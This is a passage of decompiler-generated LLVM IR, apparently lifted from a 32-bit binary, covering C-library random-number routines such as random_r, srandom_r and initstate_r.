  %v11_8050ba6 = trunc i64 %v10_8050ba6 to i32
  %v6_8050bab = icmp ugt i32 %v11_8050ba6, 4
  br i1 %v6_8050bab, label %dec_label_pc_8050beb, label %dec_label_pc_8050bad

dec_label_pc_8050bad:                             ; preds = %dec_label_pc_8050b9d
  %v1_8050bad = mul i32 %v11_8050ba6, 4
  %v2_8050bad = add i32 %v1_8050bad, ptrtoint (i32* @global_var_8054294.145 to i32)
  %v3_8050bad = inttoptr i32 %v2_8050bad to i32*
  %v4_8050bad = load i32, i32* %v3_8050bad, align 4
  store i32 %v4_8050bad, i32* %ecx.global-to-local, align 4
  %v1_8050bb4 = icmp eq i32 %v11_8050ba6, 0
  %v2_8050bb6 = add i32 %v1_8050bad, ptrtoint (i32* @global_var_8054280.146 to i32)
  %v3_8050bb6 = inttoptr i32 %v2_8050bb6 to i32*
  %v4_8050bb6 = load i32, i32* %v3_8050bb6, align 4
  store i32 %v4_8050bb6, i32* %ebp.global-to-local, align 4
  %v1_8050bbd = load i32, i32* %ebx.global-to-local, align 4
  %v2_8050bbd = add i32 %v1_8050bbd, 12
  %v3_8050bbd = inttoptr i32 %v2_8050bbd to i32*
  store i32 %v11_8050ba6, i32* %v3_8050bbd, align 4
  %v0_8050bc0 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8050bc0 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8050bc0 = add i32 %v1_8050bc0, 16
  %v3_8050bc0 = inttoptr i32 %v2_8050bc0 to i32*
  store i32 %v0_8050bc0, i32* %v3_8050bc0, align 4
  %v0_8050bc3 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8050bc3 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8050bc3 = add i32 %v1_8050bc3, 20
  %v3_8050bc3 = inttoptr i32 %v2_8050bc3 to i32*
  store i32 %v0_8050bc3, i32* %v3_8050bc3, align 4
  br i1 %v1_8050bb4, label %dec_label_pc_8050bde, label %dec_label_pc_8050bc8

dec_label_pc_8050bc8:                             ; preds = %dec_label_pc_8050bad
  %v0_8050bc8 = load i32, i32* %esi.global-to-local, align 4
  %v1_8050bc8 = add i32 %v0_8050bc8, -4
  %v2_8050bc8 = inttoptr i32 %v1_8050bc8 to i32*
  %v3_8050bc8 = load i32, i32* %v2_8050bc8, align 4
  %v1_8050bcb = ashr i32 %v3_8050bc8, 31
  %v0_8050bcc = load i32, i32* %edi.global-to-local, align 4
  %v2_8050bcc = zext i32 %v3_8050bc8 to i64
  %v4_8050bcc = zext i32 %v1_8050bcb to i64
  %v5_8050bcc = mul nuw i64 %v4_8050bcc, 4294967296
  %v6_8050bcc = or i64 %v5_8050bcc, %v2_8050bcc
  %v7_8050bcc = zext i32 %v0_8050bcc to i64
  %v8_8050bcc = sdiv i64 %v6_8050bcc, %v7_8050bcc
  %v9_8050bcc = trunc i64 %v8_8050bcc to i32
  %v2_8050bce = mul i32 %v9_8050bcc, 4
  %v3_8050bce = add i32 %v2_8050bce, %v0_8050bc8
  %v1_8050bd1 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8050bd1 = add i32 %v1_8050bd1, %v9_8050bcc
  store i32 %v2_8050bd1, i32* %eax.global-to-local, align 4
  %v1_8050bd3 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8050bd3 = add i32 %v1_8050bd3, 4
  %v3_8050bd3 = inttoptr i32 %v2_8050bd3 to i32*
  store i32 %v3_8050bce, i32* %v3_8050bd3, align 4
  %v0_8050bd6 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050bd6 = ashr i32 %v0_8050bd6, 31
  %v0_8050bd7 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8050bd7 = zext i32 %v0_8050bd6 to i64
  %v4_8050bd7 = zext i32 %v1_8050bd6 to i64
  %v5_8050bd7 = mul nuw i64 %v4_8050bd7, 4294967296
  %v6_8050bd7 = or i64 %v5_8050bd7, %v2_8050bd7
  %v7_8050bd7 = zext i32 %v0_8050bd7 to i64
  %v8_8050bd7 = sdiv i64 %v6_8050bd7, %v7_8050bd7
  %v9_8050bd7 = trunc i64 %v8_8050bd7 to i32
  store i32 %v9_8050bd7, i32* %eax.global-to-local, align 4
  %v10_8050bd7 = srem i64 %v6_8050bd7, %v7_8050bd7
  %v11_8050bd7 = trunc i64 %v10_8050bd7 to i32
  %v0_8050bd9 = load i32, i32* %esi.global-to-local, align 4
  %v2_8050bd9 = mul i32 %v11_8050bd7, 4
  %v3_8050bd9 = add i32 %v2_8050bd9, %v0_8050bd9
  %v1_8050bdc = load i32, i32* %ebx.global-to-local, align 4
  %v2_8050bdc = inttoptr i32 %v1_8050bdc to i32*
  store i32 %v3_8050bd9, i32* %v2_8050bdc, align 4
  br label %dec_label_pc_8050bde

dec_label_pc_8050bde:                             ; preds = %dec_label_pc_8050bad, %dec_label_pc_8050bc8
  %v0_8050bde = load i32, i32* %esi.global-to-local, align 4
  %v1_8050bde = load i32, i32* %ecx.global-to-local, align 4
  %v2_8050bde = mul i32 %v1_8050bde, 4
  %v3_8050bde = add i32 %v2_8050bde, %v0_8050bde
  %v1_8050be1 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8050be1 = add i32 %v1_8050be1, 24
  %v3_8050be1 = inttoptr i32 %v2_8050be1 to i32*
  store i32 %v3_8050bde, i32* %v3_8050be1, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_8050be6 = load i32, i32* %esi.global-to-local, align 4
  %v1_8050be6 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8050be6 = add i32 %v1_8050be6, 8
  %v3_8050be6 = inttoptr i32 %v2_8050be6 to i32*
  store i32 %v0_8050be6, i32* %v3_8050be6, align 4
  %v0_8050c00.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050bf9

dec_label_pc_8050beb:                             ; preds = %dec_label_pc_8050b9d
  %v1_8050beb = call i32 @__errno_location(i32 %v0_8050b6b)
  %v1_8050bf0 = inttoptr i32 %v1_8050beb to i32*
  store i32 22, i32* %v1_8050bf0, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050bf9

dec_label_pc_8050bf9:                             ; preds = %dec_label_pc_8050bde, %dec_label_pc_8050beb
  %v0_8050c00 = phi i32 [ %v0_8050c00.pre, %dec_label_pc_8050bde ], [ -1, %dec_label_pc_8050beb ]
  store i32 %v0_8050b6b, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8050c00

; uselistorder directives
  uselistorder i32 %v11_8050ba6, { 1, 3, 2, 0 }
  uselistorder i32 %tmp3, { 0, 1, 3, 2 }
  uselistorder i64 5, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8050bf9, { 1, 0 }
  uselistorder label %dec_label_pc_8050bde, { 1, 0 }
  uselistorder label %dec_label_pc_8050b9d, { 1, 0 }
}

define i32 @__GI_random_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v0_8050c04 = load i32, i32* @ebx, align 4
  store i32 %v0_8050c04, i32* %stack_var_-16, align 4
  store i32 %tmp3, i32* %ebx.global-to-local, align 4
  store i32 %arg2, i32* %ebp.global-to-local, align 4
  %v1_8050c0d = add i32 %tmp3, 12
  %v2_8050c0d = inttoptr i32 %v1_8050c0d to i32*
  %v3_8050c0d = load i32, i32* %v2_8050c0d, align 4
  %v4_8050c0d = icmp eq i32 %v3_8050c0d, 0
  %v1_8050c11 = add i32 %tmp3, 8
  %v2_8050c11 = inttoptr i32 %v1_8050c11 to i32*
  %v3_8050c11 = load i32, i32* %v2_8050c11, align 4
  store i32 %v3_8050c11, i32* %esi.global-to-local, align 4
  %v1_8050c14 = icmp eq i1 %v4_8050c0d, false
  br i1 %v1_8050c14, label %dec_label_pc_8050c2d, label %dec_label_pc_8050c16

dec_label_pc_8050c16:                             ; preds = %entry
  %v2_8050c16 = inttoptr i32 %v3_8050c11 to i32*
  %v3_8050c16 = load i32, i32* %v2_8050c16, align 4
  %v5_8050c16 = mul i32 %v3_8050c16, 1103515245
  %v1_8050c1c = add i32 %v5_8050c16, 12345
  %v1_8050c21 = urem i32 %v1_8050c1c, -2147483648
  store i32 %v1_8050c21, i32* %eax.global-to-local, align 4
  store i32 %v1_8050c21, i32* %v2_8050c16, align 4
  %v0_8050c28 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050c28 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8050c28 = inttoptr i32 %v1_8050c28 to i32*
  store i32 %v0_8050c28, i32* %v2_8050c28, align 4
  br label %dec_label_pc_8050c58

dec_label_pc_8050c2d:                             ; preds = %entry
  %v1_8050c2d = add i32 %tmp3, 4
  %v2_8050c2d = inttoptr i32 %v1_8050c2d to i32*
  %v3_8050c2d = load i32, i32* %v2_8050c2d, align 4
  store i32 %v3_8050c2d, i32* %ecx.global-to-local, align 4
  %v2_8050c30 = load i32, i32* %arg1, align 4
  store i32 %v2_8050c30, i32* %edx.global-to-local, align 4
  %v1_8050c32 = add i32 %tmp3, 24
  %v2_8050c32 = inttoptr i32 %v1_8050c32 to i32*
  %v3_8050c32 = load i32, i32* %v2_8050c32, align 4
  store i32 %v3_8050c32, i32* %edi.global-to-local, align 4
  %v1_8050c35 = inttoptr i32 %v3_8050c2d to i32*
  %v2_8050c35 = load i32, i32* %v1_8050c35, align 4
  store i32 %v2_8050c35, i32* %eax.global-to-local, align 4
  %v1_8050c37 = inttoptr i32 %v2_8050c30 to i32*
  %v2_8050c37 = load i32, i32* %v1_8050c37, align 4
  %v4_8050c37 = add i32 %v2_8050c37, %v2_8050c35
  store i32 %v4_8050c37, i32* %v1_8050c37, align 4
  %v0_8050c39 = load i32, i32* %edx.global-to-local, align 4
  %v1_8050c39 = inttoptr i32 %v0_8050c39 to i32*
  %v2_8050c39 = load i32, i32* %v1_8050c39, align 4
  %v1_8050c3b = add i32 %v0_8050c39, 4
  store i32 %v1_8050c3b, i32* %edx.global-to-local, align 4
  %v2_8050c3e = udiv i32 %v2_8050c39, 2
  %v1_8050c40 = load i32, i32* %edi.global-to-local, align 4
  %v7_8050c40 = icmp ult i32 %v1_8050c3b, %v1_8050c40
  %v1_8050c42 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8050c42 = inttoptr i32 %v1_8050c42 to i32*
  store i32 %v2_8050c3e, i32* %v2_8050c42, align 4
  %v0_8050c45 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8050c45 = add i32 %v0_8050c45, 4
  store i32 %v1_8050c45, i32* %eax.global-to-local, align 4
  br i1 %v7_8050c40, label %dec_label_pc_8050c4e, label %dec_label_pc_8050c4a

dec_label_pc_8050c4a:                             ; preds = %dec_label_pc_8050c2d
  %v0_8050c4a = load i32, i32* %esi.global-to-local, align 4
  store i32 %v0_8050c4a, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8050c53

dec_label_pc_8050c4e:                             ; preds = %dec_label_pc_8050c2d
  %v1_8050c4e = load i32, i32* %edi.global-to-local, align 4
  %v7_8050c4e = icmp ult i32 %v1_8050c45, %v1_8050c4e
  %v1_8050c50 = icmp eq i1 %v7_8050c4e, false
  %v3_8050c50 = load i32, i32* %esi.global-to-local, align 4
  %v4_8050c50 = select i1 %v1_8050c50, i32 %v3_8050c50, i32 %v1_8050c45
  store i32 %v4_8050c50, i32* %eax.global-to-local, align 4
  %v0_8050c53.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8050c53

dec_label_pc_8050c53:                             ; preds = %dec_label_pc_8050c4a, %dec_label_pc_8050c4e
  %v0_8050c53 = phi i32 [ %v0_8050c4a, %dec_label_pc_8050c4a ], [ %v0_8050c53.pre, %dec_label_pc_8050c4e ]
  %v1_8050c53 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8050c53 = inttoptr i32 %v1_8050c53 to i32*
  store i32 %v0_8050c53, i32* %v2_8050c53, align 4
  %v0_8050c55 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050c55 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8050c55 = add i32 %v1_8050c55, 4
  %v3_8050c55 = inttoptr i32 %v2_8050c55 to i32*
  store i32 %v0_8050c55, i32* %v3_8050c55, align 4
  br label %dec_label_pc_8050c58

dec_label_pc_8050c58:                             ; preds = %dec_label_pc_8050c16, %dec_label_pc_8050c53
  %v2_8050c58 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8050c58, i32* @ebx, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_8050c21, { 1, 0 }
  uselistorder i32 %tmp3, { 0, 1, 2, 4, 3 }
  uselistorder i32* %edx.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32* %eax.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_8050c58, { 1, 0 }
  uselistorder label %dec_label_pc_8050c53, { 1, 0 }
}

define i32 @srandom_r(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp14 = ptrtoint i32* %arg2 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-40 = alloca i64, align 8
  %v0_8050c5f = load i32, i32* @ebp, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_8050c63 = load i32, i32* @edi, align 4
  %v0_8050c64 = load i32, i32* @esi, align 4
  %v0_8050c65 = load i32, i32* @ebx, align 4
  store i32 %tmp14, i32* @esi, align 4
  store i32 %arg1, i32* %edx.global-to-local, align 4
  %v1_8050c71 = add i32 %tmp14, 12
  %v2_8050c71 = inttoptr i32 %v1_8050c71 to i32*
  %v3_8050c71 = load i32, i32* %v2_8050c71, align 4
  store i32 %v3_8050c71, i32* %ecx.global-to-local, align 4
  %v6_8050c77 = icmp ugt i32 %v3_8050c71, 4
  br i1 %v6_8050c77, label %dec_label_pc_8050cf1, label %dec_label_pc_8050c79

dec_label_pc_8050c79:                             ; preds = %entry
  %v1_8050c79 = add i32 %tmp14, 8
  %v2_8050c79 = inttoptr i32 %v1_8050c79 to i32*
  %v3_8050c79 = load i32, i32* %v2_8050c79, align 4
  store i32 %v3_8050c79, i32* %ebx.global-to-local, align 4
  %v1_8050c7c = icmp eq i32 %arg1, 0
  store i32 1, i32* %eax.global-to-local, align 4
  %v3_8050c83 = select i1 %v1_8050c7c, i32 1, i32 %arg1
  store i32 %v3_8050c83, i32* %edx.global-to-local, align 4
  %v1_8050c86 = icmp eq i32 %v3_8050c71, 0
  %v2_8050c88 = inttoptr i32 %v3_8050c79 to i32*
  store i32 %v3_8050c83, i32* %v2_8050c88, align 4
  br i1 %v1_8050c86, label %dec_label_pc_8050cef, label %dec_label_pc_8050c8c

dec_label_pc_8050c8c:                             ; preds = %dec_label_pc_8050c79
  %v0_8050c8c = load i32, i32* @esi, align 4
  %v1_8050c8c = add i32 %v0_8050c8c, 16
  %v2_8050c8c = inttoptr i32 %v1_8050c8c to i32*
  %v3_8050c8c = load i32, i32* %v2_8050c8c, align 4
  store i32 %v3_8050c8c, i32* %eax.global-to-local, align 4
  %v0_8050c8f = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8050c8f, i32* %ecx.global-to-local, align 4
  store i32 1, i32* @edi, align 4
  %v4_8050c96 = sext i32 %v3_8050c8c to i64
  store i64 %v4_8050c96, i64* %stack_var_-40, align 8
  %v5_8050ccc32 = icmp sgt i32 %v3_8050c8c, 1
  br i1 %v5_8050ccc32, label %dec_label_pc_8050c9b, label %dec_label_pc_8050cce

dec_label_pc_8050c9b:                             ; preds = %dec_label_pc_8050c8c, %dec_label_pc_8050c9b.dec_label_pc_8050c9b_crit_edge
  %v0_8050cc3 = phi i32 [ %v0_8050cc3.pre, %dec_label_pc_8050c9b.dec_label_pc_8050c9b_crit_edge ], [ %v0_8050c8f, %dec_label_pc_8050c8c ]
  %v0_8050c9b = load i32, i32* %edx.global-to-local, align 4
  %v1_8050ca2 = ashr i32 %v0_8050c9b, 31
  %v2_8050ca3 = zext i32 %v0_8050c9b to i64
  %v4_8050ca3 = zext i32 %v1_8050ca2 to i64
  %v5_8050ca3 = mul nuw i64 %v4_8050ca3, 4294967296
  %v6_8050ca3 = or i64 %v5_8050ca3, %v2_8050ca3
  %v8_8050ca3 = sdiv i64 %v6_8050ca3, 127773
  %v9_8050ca3 = trunc i64 %v8_8050ca3 to i32
  %v10_8050ca3 = srem i64 %v6_8050ca3, 127773
  %v3_8050ca9 = mul nsw i64 %v10_8050ca3, 16807
  %v4_8050ca9 = trunc i64 %v3_8050ca9 to i32
  %tmp24 = mul i32 %v9_8050ca3, -2836
  %v2_8050cb5 = add i32 %v4_8050ca9, %tmp24
  %v1_8050cb7 = add i32 %v2_8050cb5, 1
  %v6_8050cb7 = xor i32 %v2_8050cb5, -2147483648
  %v7_8050cb7 = xor i32 %v1_8050cb7, %v2_8050cb5
  %v8_8050cb7 = and i32 %v7_8050cb7, %v6_8050cb7
  %v9_8050cb7 = icmp slt i32 %v8_8050cb7, 0
  %v10_8050cb7 = icmp eq i32 %v1_8050cb7, 0
  %v11_8050cb7 = icmp slt i32 %v1_8050cb7, 0
  %v1_8050cba = add i32 %v2_8050cb5, 2147483647
  store i32 %v1_8050cba, i32* %eax.global-to-local, align 4
  %v3_8050cc0 = icmp ne i1 %v11_8050cb7, %v9_8050cb7
  %v4_8050cc0 = or i1 %v10_8050cb7, %v3_8050cc0
  %v7_8050cc0 = select i1 %v4_8050cc0, i32 %v1_8050cba, i32 %v2_8050cb5
  store i32 %v7_8050cc0, i32* %edx.global-to-local, align 4
  %v1_8050cc3 = add i32 %v0_8050cc3, 4
  store i32 %v1_8050cc3, i32* %ecx.global-to-local, align 4
  %v2_8050cc6 = inttoptr i32 %v1_8050cc3 to i32*
  store i32 %v7_8050cc0, i32* %v2_8050cc6, align 4
  %v0_8050cc8 = load i32, i32* @edi, align 4
  %v1_8050cc8 = add i32 %v0_8050cc8, 1
  store i32 %v1_8050cc8, i32* @edi, align 4
  %v3_8050cc9.pre = load i64, i64* %stack_var_-40, align 8
  %extract.t11 = trunc i64 %v3_8050cc9.pre to i32
  %v5_8050ccc = icmp slt i32 %v1_8050cc8, %extract.t11
  br i1 %v5_8050ccc, label %dec_label_pc_8050c9b.dec_label_pc_8050c9b_crit_edge, label %dec_label_pc_8050cc9.dec_label_pc_8050cce_crit_edge

dec_label_pc_8050c9b.dec_label_pc_8050c9b_crit_edge: ; preds = %dec_label_pc_8050c9b
  %v0_8050cc3.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8050c9b

dec_label_pc_8050cc9.dec_label_pc_8050cce_crit_edge: ; preds = %dec_label_pc_8050c9b
  %v0_8050cce.pre = load i32, i32* @esi, align 4
  %v0_8050cd1.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050cce

dec_label_pc_8050cce:                             ; preds = %dec_label_pc_8050cc9.dec_label_pc_8050cce_crit_edge, %dec_label_pc_8050c8c
  %v0_8050cd1 = phi i32 [ %v0_8050cd1.pre, %dec_label_pc_8050cc9.dec_label_pc_8050cce_crit_edge ], [ %v0_8050c8f, %dec_label_pc_8050c8c ]
  %v0_8050cce = phi i32 [ %v0_8050cce.pre, %dec_label_pc_8050cc9.dec_label_pc_8050cce_crit_edge ], [ %v0_8050c8c, %dec_label_pc_8050c8c ]
  %v1_8050cce = add i32 %v0_8050cce, 20
  %v2_8050cce = inttoptr i32 %v1_8050cce to i32*
  %v3_8050cce = load i32, i32* %v2_8050cce, align 4
  store i32 %v3_8050cce, i32* %eax.global-to-local, align 4
  %v2_8050cd1 = add i32 %v0_8050cce, 4
  %v3_8050cd1 = inttoptr i32 %v2_8050cd1 to i32*
  store i32 %v0_8050cd1, i32* %v3_8050cd1, align 4
  %v0_8050cd4 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050cd4 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050cd4 = mul i32 %v1_8050cd4, 4
  %v3_8050cd4 = add i32 %v2_8050cd4, %v0_8050cd4
  store i32 %v3_8050cd4, i32* %eax.global-to-local, align 4
  %v1_8050cd7 = load i32, i32* @esi, align 4
  %v2_8050cd7 = inttoptr i32 %v1_8050cd7 to i32*
  store i32 %v3_8050cd4, i32* %v2_8050cd7, align 4
  %v3_8050cd9 = load i64, i64* %stack_var_-40, align 8
  %v6_8050cd9 = mul nsw i64 %v3_8050cd9, 10
  %v7_8050cd9 = trunc i64 %v6_8050cd9 to i32
  %v2_8050cdf = ptrtoint i32* %stack_var_-20 to i32
  %v1_8050cec25 = add i32 %v7_8050cd9, -1
  %v9_8050cec29 = icmp slt i32 %v1_8050cec25, 0
  store i32 %v1_8050cec25, i32* @ebx, align 4
  %v1_8050ced30 = icmp eq i1 %v9_8050cec29, false
  br i1 %v1_8050ced30, label %dec_label_pc_8050cdf, label %dec_label_pc_8050cef

dec_label_pc_8050cdf:                             ; preds = %dec_label_pc_8050cce, %dec_label_pc_8050cdf
  store i32 %v2_8050cdf, i32* %eax.global-to-local, align 4
  %v0_8050ce4 = load i32, i32* @esi, align 4
  %v2_8050ce5 = inttoptr i32 %v0_8050ce4 to i32*
  %v3_8050ce5 = call i32 @__GI_random_r(i32* %v2_8050ce5, i32 %v2_8050cdf)
  store i32 %v0_8050ce4, i32* %eax.global-to-local, align 4
  store i32 %v2_8050cdf, i32* %edx.global-to-local, align 4
  %v0_8050cec.pre = load i32, i32* @ebx, align 4
  %v1_8050cec = add i32 %v0_8050cec.pre, -1
  %v9_8050cec = icmp slt i32 %v1_8050cec, 0
  store i32 %v1_8050cec, i32* @ebx, align 4
  %v1_8050ced = icmp eq i1 %v9_8050cec, false
  br i1 %v1_8050ced, label %dec_label_pc_8050cdf, label %dec_label_pc_8050cef

dec_label_pc_8050cef:                             ; preds = %dec_label_pc_8050cce, %dec_label_pc_8050cdf, %dec_label_pc_8050c79
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050cf1

dec_label_pc_8050cf1:                             ; preds = %entry, %dec_label_pc_8050cef
  %v0_8050cf8 = phi i32 [ -1, %entry ], [ 0, %dec_label_pc_8050cef ]
  store i32 %v0_8050c65, i32* @ebx, align 4
  store i32 %v0_8050c64, i32* @esi, align 4
  store i32 %v0_8050c63, i32* @edi, align 4
  store i32 %v0_8050c5f, i32* @ebp, align 4
  ret i32 %v0_8050cf8

; uselistorder directives
  uselistorder i32 %v1_8050cec, { 1, 0 }
  uselistorder i32 %v0_8050cce, { 1, 0 }
  uselistorder i32 %v1_8050cb7, { 2, 1, 0 }
  uselistorder i32 %v2_8050cb5, { 3, 4, 0, 2, 1 }
  uselistorder i32 %v0_8050c8f, { 1, 0, 2 }
  uselistorder i32 %v3_8050c71, { 1, 0, 2 }
  uselistorder i64* %stack_var_-40, { 2, 0, 1 }
  uselistorder i32 %tmp14, { 0, 2, 1 }
  uselistorder i32* %ebx.global-to-local, { 0, 2, 1, 3 }
  uselistorder i64 127773, { 1, 0 }
  uselistorder label %dec_label_pc_8050cf1, { 1, 0 }
  uselistorder label %dec_label_pc_8050cef, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8050cdf, { 1, 0 }
  uselistorder label %dec_label_pc_8050c9b, { 1, 0 }
}

define i32 @__GI_initstate_r(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp7 = ptrtoint i32* %arg2 to i32
  %stack_var_-36 = alloca i32, align 4
  %v0_8050cfb = load i32, i32* @esi, align 4
  %v0_8050cfc = load i32, i32* @ebx, align 4
  store i32 %arg3, i32* %eax.global-to-local, align 4
  store i32 %tmp7, i32* @ebp, align 4
  store i32 %arg4, i32* @edi, align 4
  %tmp = icmp ult i32 %arg3, 128
  br i1 %tmp, label %dec_label_pc_8050d1d, label %dec_label_pc_8050d11

dec_label_pc_8050d11:                             ; preds = %entry
  %v2_8050d11 = icmp ult i32 %arg3, 256
  %v1_8050d18 = select i1 %v2_8050d11, i32 5, i32 4
  store i32 %v1_8050d18, i32* @ebx, align 4
  br label %dec_label_pc_8050d33

dec_label_pc_8050d1d:                             ; preds = %entry
  %v6_8050d20 = icmp ugt i32 %arg3, 31
  br i1 %v6_8050d20, label %dec_label_pc_8050d2b, label %dec_label_pc_8050d22

dec_label_pc_8050d22:                             ; preds = %dec_label_pc_8050d1d
  store i32 0, i32* @ebx, align 4
  %v6_8050d27 = icmp ugt i32 %arg3, 7
  br i1 %v6_8050d27, label %dec_label_pc_8050d33, label %dec_label_pc_8050d83

dec_label_pc_8050d2b:                             ; preds = %dec_label_pc_8050d1d
  %v2_8050d2b = icmp ult i32 %arg3, 64
  %v1_8050d30 = select i1 %v2_8050d2b, i32 3, i32 2
  store i32 %v1_8050d30, i32* @ebx, align 4
  br label %dec_label_pc_8050d33

dec_label_pc_8050d33:                             ; preds = %dec_label_pc_8050d22, %dec_label_pc_8050d11, %dec_label_pc_8050d2b
  %v0_8050d3d = phi i32 [ 0, %dec_label_pc_8050d22 ], [ %v1_8050d18, %dec_label_pc_8050d11 ], [ %v1_8050d30, %dec_label_pc_8050d2b ]
  %v1_8050d33 = mul nuw nsw i32 %v0_8050d3d, 4
  %v2_8050d33 = add i32 %v1_8050d33, ptrtoint (i32* @global_var_8054294.145 to i32)
  %v3_8050d33 = inttoptr i32 %v2_8050d33 to i32*
  %v4_8050d33 = load i32, i32* %v3_8050d33, align 4
  store i32 %v4_8050d33, i32* %eax.global-to-local, align 4
  %v1_8050d3a = add i32 %tmp7, 4
  store i32 %v1_8050d3a, i32* @esi, align 4
  %v2_8050d3d = add i32 %v1_8050d33, ptrtoint (i32* @global_var_8054280.146 to i32)
  %v3_8050d3d = inttoptr i32 %v2_8050d3d to i32*
  %v4_8050d3d = load i32, i32* %v3_8050d3d, align 4
  store i32 %v4_8050d3d, i32* %edx.global-to-local, align 4
  %v2_8050d44 = add i32 %arg4, 12
  %v3_8050d44 = inttoptr i32 %v2_8050d44 to i32*
  store i32 %v0_8050d3d, i32* %v3_8050d44, align 4
  %v0_8050d47 = load i32, i32* @esi, align 4
  %v1_8050d47 = load i32, i32* @edi, align 4
  %v2_8050d47 = add i32 %v1_8050d47, 8
  %v3_8050d47 = inttoptr i32 %v2_8050d47 to i32*
  store i32 %v0_8050d47, i32* %v3_8050d47, align 4
  %v0_8050d4a = load i32, i32* %eax.global-to-local, align 4
  %v1_8050d4a = load i32, i32* @edi, align 4
  %v2_8050d4a = add i32 %v1_8050d4a, 16
  %v3_8050d4a = inttoptr i32 %v2_8050d4a to i32*
  store i32 %v0_8050d4a, i32* %v3_8050d4a, align 4
  %v0_8050d4d = load i32, i32* @esi, align 4
  %v1_8050d4d = load i32, i32* %eax.global-to-local, align 4
  %v2_8050d4d = mul i32 %v1_8050d4d, 4
  %v3_8050d4d = add i32 %v2_8050d4d, %v0_8050d4d
  store i32 %v3_8050d4d, i32* %eax.global-to-local, align 4
  %v0_8050d50 = load i32, i32* %edx.global-to-local, align 4
  %v1_8050d50 = load i32, i32* @edi, align 4
  %v2_8050d50 = add i32 %v1_8050d50, 20
  %v3_8050d50 = inttoptr i32 %v2_8050d50 to i32*
  store i32 %v0_8050d50, i32* %v3_8050d50, align 4
  %v0_8050d53 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050d53 = load i32, i32* @edi, align 4
  %v2_8050d53 = add i32 %v1_8050d53, 24
  %v3_8050d53 = inttoptr i32 %v2_8050d53 to i32*
  store i32 %v0_8050d53, i32* %v3_8050d53, align 4
  %v0_8050d56 = load i32, i32* @edi, align 4
  store i32 %arg1, i32* %stack_var_-36, align 4
  %v2_8050d5b = inttoptr i32 %v0_8050d56 to i32*
  %v3_8050d5b = call i32 @srandom_r(i32 %arg1, i32* %v2_8050d5b)
  %v0_8050d60 = load i32, i32* @ebp, align 4
  %v1_8050d60 = inttoptr i32 %v0_8050d60 to i32*
  store i32 0, i32* %v1_8050d60, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_8050d6b = load i32, i32* @ebx, align 4
  %v1_8050d6b = icmp eq i32 %v0_8050d6b, 0
  br i1 %v1_8050d6b, label %dec_label_pc_8050d9c, label %dec_label_pc_8050d6f

dec_label_pc_8050d6f:                             ; preds = %dec_label_pc_8050d33
  %v0_8050d6f = load i32, i32* @edi, align 4
  %v1_8050d6f = add i32 %v0_8050d6f, 4
  %v2_8050d6f = inttoptr i32 %v1_8050d6f to i32*
  %v3_8050d6f = load i32, i32* %v2_8050d6f, align 4
  %v1_8050d72 = load i32, i32* @esi, align 4
  %v2_8050d72 = sub i32 %v3_8050d6f, %v1_8050d72
  %v2_8050d74 = sdiv i32 %v2_8050d72, 4
  %v3_8050d77 = mul i32 %v2_8050d74, 5
  %v2_8050d7a = add i32 %v3_8050d77, %v0_8050d6b
  %v1_8050d7c = load i32, i32* @ebp, align 4
  %v2_8050d7c = inttoptr i32 %v1_8050d7c to i32*
  store i32 %v2_8050d7a, i32* %v2_8050d7c, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050d9c

